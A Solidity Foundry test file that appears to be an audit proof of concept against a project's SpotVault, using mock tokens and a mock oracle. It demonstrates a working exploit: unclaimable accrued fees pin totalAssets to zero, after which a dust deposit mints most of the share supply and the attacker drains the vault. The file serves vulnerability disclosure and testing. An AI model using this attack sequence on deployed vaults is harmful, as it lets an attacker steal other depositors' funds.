// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SpotVault, ISpotSwapAdapter, AggregatorV3Interface} from "../../src/vaults/SpotVault.sol";
import {MockERC20} from "../invariants/mocks/MockERC20.sol";

contract MockOracle2 is AggregatorV3Interface {
    int256 public answer;
    uint256 public updatedAt;
    uint8 public constant decimals = 8;
    constructor(int256 a) { answer = a; updatedAt = block.timestamp; }
    function setPrice(int256 a) external { answer = a; updatedAt = block.timestamp; }
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, updatedAt, updatedAt, 1);
    }
}

contract MockSpotAdapter2 is ISpotSwapAdapter {
    address public immutable asset;
    address public immutable cash;
    MockOracle2 public immutable oracle;
    uint8 immutable aDec; uint8 immutable cDec; uint8 immutable pDec;
    constructor(address asset_, address cash_, address oracle_) {
        asset = asset_; cash = cash_; oracle = MockOracle2(oracle_);
        aDec = IERC20Metadata(asset_).decimals();
        cDec = IERC20Metadata(cash_).decimals();
        pDec = MockOracle2(oracle_).decimals();
    }
    function swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 minOut) external returns (uint256 out) {
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        uint256 p = uint256(oracle.answer());
        if (tokenIn == asset && tokenOut == cash) {
            out = (amountIn * (10 ** cDec) * p) / ((10 ** aDec) * (10 ** pDec));
        } else {
            out = (amountIn * (10 ** aDec) * (10 ** pDec)) / ((10 ** cDec) * p);
        }
        require(out >= minOut, "mock slippage");
        IERC20(tokenOut).transfer(msg.sender, out);
    }
}

contract SpotVaultPinPoc is Test {
    MockERC20 wbtc; MockERC20 usdc; MockOracle2 oracle; MockSpotAdapter2 adapter; SpotVault vault;
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    address deployer = address(this);

    function setUp() public {
        vm.warp(1_700_000_000);
        wbtc = new MockERC20("Wrapped BTC", "WBTC", 8);
        usdc = new MockERC20("USD Coin", "USDC", 6);
        oracle = new MockOracle2(50_000 * 1e8);
        adapter = new MockSpotAdapter2(address(wbtc), address(usdc), address(oracle));
        vault = new SpotVault(
            address(wbtc), address(usdc), address(oracle), 1 hours,
            "Zentory BTC Spot Vault", "zBTCs",
            0, 100, 2000, // perf fee 20% (production default)
            address(this), address(this)
        );
        vault.setSwapAdapter(address(adapter));
        vault.grantRole(vault.KEEPER_ROLE(), address(this));
        wbtc.mint(address(adapter), 100_000 * 1e8);
        usdc.mint(address(adapter), 1_000_000_000 * 1e6);
        wbtc.mint(alice, 10 * 1e8);
        wbtc.mint(attacker, 1e8);
        wbtc.mint(deployer, 1e6);
    }

    function test_poc_pinToZero_then_dust_inflation() public {
        // 1) seed deposit per runbook: 0.01 WBTC
        wbtc.approve(address(vault), 1e6);
        uint256 seedShares = vault.deposit(1e6, deployer);

        // 2) real depositor
        vm.startPrank(alice);
        wbtc.approve(address(vault), 10 * 1e8);
        uint256 aliceShares = vault.deposit(10 * 1e8, alice);
        vm.stopPrank();

        // 3) strategy earns real alpha: flat at 50k, BTC halves, rebuy at 25k
        vault.rebalanceTo(0);
        oracle.setPrice(25_000 * 1e8);
        vault.rebalanceTo(10000);
        console2.log("gross after alpha (BTC 1e8):", vault.grossValue());

        // 4) keeper accrues the 20% perf fee (NEVER claimable: SpotVault has no claimFees)
        vault.evaluateFees();
        console2.log("accrued:", vault.performanceFeeAccrued());
        assertGt(vault.performanceFeeAccrued(), 0);

        // 5) the big LP exits (normal user action)
        vm.prank(alice);
        vault.redeem(aliceShares, alice, alice);
        console2.log("gross after exit:", vault.grossValue());
        console2.log("accrued        :", vault.performanceFeeAccrued());
        console2.log("totalAssets    :", vault.totalAssets());
        assertGt(vault.totalAssets(), 0);

        // 6) keeper goes flat (signal), then BTC ticks up modestly
        vault.rebalanceTo(0);
        oracle.setPrice(27_500 * 1e8); // +10% while sitting in cash
        console2.log("gross after +10%:", vault.grossValue());

        // ---- THE PIN: supply > 0 but totalAssets() == 0 ----
        assertGt(vault.totalSupply(), 0, "supply outstanding");
        assertEq(vault.totalAssets(), 0, "totalAssets clamped to zero");
        assertEq(vault.previewRedeem(seedShares), 0, "existing holder's shares now redeem 0");
        uint256 supplyBefore = vault.totalSupply();

        // 7) dust attacker mints ~the whole supply. NOTE: no circuit-breaker gate on
        //    SpotVault deposits (unlike BaseVault.deposit), so this cannot be paused.
        vm.startPrank(attacker);
        wbtc.approve(address(vault), 1e4);
        uint256 atkShares = vault.deposit(1e4, attacker); // 0.0001 WBTC (~$2.75)
        vm.stopPrank();
        console2.log("supply before:", supplyBefore);
        console2.log("attacker shares:", atkShares);
        assertGt(atkShares, supplyBefore * 100, "dust deposit mints >100x the whole prior supply");

        // 8) gross recovers above accrued (BTC drops back while vault is in cash = the
        //    strategy's normal alpha) -> attacker owns essentially all of it
        oracle.setPrice(20_000 * 1e8);
        console2.log("totalAssets recovered:", vault.totalAssets());
        assertGt(vault.totalAssets(), 0);

        uint256 atkGets = vault.previewRedeem(atkShares);
        uint256 seedGets = vault.previewRedeem(seedShares);
        console2.log("attacker redeems:", atkGets, " paid: 10000");
        console2.log("honest seed holder redeems:", seedGets);
        assertGt(atkGets, 1e4 * 100, "attacker extracts >100x what it paid");
        assertGt(atkGets, seedGets * 1000, "honest holder wiped out relative to attacker");

        vm.prank(attacker);
        uint256 realised = vault.redeem(atkShares, attacker, attacker);
        console2.log("attacker realised WBTC:", realised);
        assertGt(realised, 1e4 * 100);
    }
}
